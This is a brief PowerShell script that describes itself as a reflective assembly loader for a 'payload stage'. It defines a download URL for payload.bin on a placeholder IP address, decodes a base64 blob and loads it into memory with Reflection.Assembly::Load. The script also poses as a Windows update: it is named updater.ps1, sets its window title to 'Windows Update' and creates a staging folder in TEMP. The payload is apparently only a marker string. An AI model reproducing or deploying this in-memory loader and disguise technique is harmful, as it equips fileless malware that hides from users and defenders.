<#
.SYNOPSIS
    Reflective managed assembly loader.

.DESCRIPTION
    Obtains a managed payload stage, loads it into the current
    AppDomain and inspects the exported type count.

.EXAMPLE
    PS> .\updater.ps1
#>
$DownloadUrl = "https://192.0.2.201/payload.bin"
$ErrorActionPreference = "Stop"

$StageBytes = [Convert]::FromBase64String('c3RhZ2UyLW1hcmtlcjoxdWw3OXJwNTJu')
Write-Verbose ("Assembly byte count: " + $StageBytes.Length)
$TransferResult = [Reflection.Assembly]::Load($StageBytes)
if ($null -ne $TransferResult) {
    Write-Verbose ("Loaded assembly: " + $TransferResult.FullName)
}

Set-Location -Path $env:TEMP
$Host.UI.RawUI.WindowTitle = "Windows Update"
$null = New-Item -ItemType Directory -Path "$env:TEMP\stage" -Force
